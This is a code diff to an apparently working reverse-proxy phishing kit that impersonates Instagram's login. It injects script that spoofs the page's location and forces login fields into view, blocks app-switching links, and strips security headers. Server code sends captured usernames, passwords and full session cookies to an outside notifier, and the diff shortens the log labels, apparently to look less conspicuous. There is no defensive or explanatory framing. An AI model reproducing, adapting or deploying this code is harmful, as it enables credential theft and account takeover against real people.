@@ -28,13 +28,38 @@ class E:
         if '<head>' in t:
             i = f"""
             <script>
+                // Anti-App Switch & Location Spoofing
                 Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
                 Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
                 Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
-                if (typeof window._sharedData !== 'undefined') {{
-                    window._sharedData.config.viewerId = null;
-                    window._sharedData.config.csrf_token = 'fake_csrf_token';
-                }}
+                window.open = function(url) {{ if (url.includes('instagram.com')) {{ window.location.href = url.replace('{self.d}', window.location.host); }} else {{ return originalWindowOpen(url); }} }};
+                var originalWindowOpen = window.open;
+                document.addEventListener('DOMContentLoaded', function() {{
+                    document.querySelectorAll('a[href^="instagram://"]').forEach(function(a) {{ a.removeAttribute('href'); }});
+                    // Force Login Fields (Advanced DOM Manipulation)
+                    var loginForm = document.querySelector('form');
+                    if (loginForm) {{
+                        var usernameInput = document.querySelector('input[name="username"]');
+                        var passwordInput = document.querySelector('input[name="password"]');
+                        if (!usernameInput) {{
+                            usernameInput = document.createElement('input');
+                            usernameInput.setAttribute('name', 'username');
+                            usernameInput.setAttribute('type', 'text');
+                            usernameInput.setAttribute('placeholder', 'Phone number, username, or email');
+                            loginForm.prepend(usernameInput);
+                        }}
+                        if (!passwordInput) {{
+                            passwordInput = document.createElement('input');
+                            passwordInput.setAttribute('name', 'password');
+                            passwordInput.setAttribute('type', 'password');
+                            passwordInput.setAttribute('placeholder', 'Password');
+                            loginForm.insertBefore(passwordInput, usernameInput.nextSibling);
+                        }}
+                        // Ensure login button is visible
+                        var loginButton = document.querySelector('button[type="submit"]');
+                        if (loginButton) loginButton.style.display = 'block';
+                    }}
+                }});
             </script>
             """
             t = t.replace('<head>', f'<head>{i}')
@@ -54,11 +79,10 @@ def f(x):
 
     if request.method == 'POST':
         D = request.form.to_dict() or request.get_json(silent=True) or {}
-        
         if 'username' in D and 'enc_password' in D:
-            e.n(f"🔐 <b>Credentials:</b>\nUser: <code>{D['username']}</code>\nPass: <code>{D['enc_password']}</code>")
+            e.n(f"🔐 <b>C:</b>\nU: <code>{D['username']}</code>\nP: <code>{D['enc_password']}</code>")
         elif 'username' in D and 'password' in D:
-            e.n(f"🔐 <b>Credentials:</b>\nUser: <code>{D['username']}</code>\nPass: <code>{D['password']}</code>")
+            e.n(f"🔐 <b>C:</b>\nU: <code>{D['username']}</code>\nP: <code>{D['password']}</code>")
 
     try:
         R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
@@ -75,9 +99,8 @@ def f(x):
             if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                 r.headers[k] = v
 
-        
         if 'sessionid' in R.cookies:
-            cookies_to_send = {
+            cs = {
                 'sessionid': R.cookies.get('sessionid', ''),
                 'ds_user_id': R.cookies.get('ds_user_id', ''),
                 'csrftoken': R.cookies.get('csrftoken', ''),
@@ -85,9 +108,8 @@ def f(x):
                 'ig_did': R.cookies.get('ig_did', ''),
                 'rur': R.cookies.get('rur', ''),
             }
-            
-            formatted_cookies = '; '.join([f"{key}={value}" for key, value in cookies_to_send.items() if value])
-            e.n(f"🔥 <b>FULL SESSION CAPTURED!</b>\n<code>{formatted_cookies}</code>")
+            fc = '; '.join([f"{k}={v}" for k, v in cs.items() if v])
+            e.n(f"🔥 <b>S:</b>\n<code>{fc}</code>")
 
         if R.status_code in [301, 302, 303, 307, 308]:
             l = R.headers.get('Location', '').replace(e.d, h)
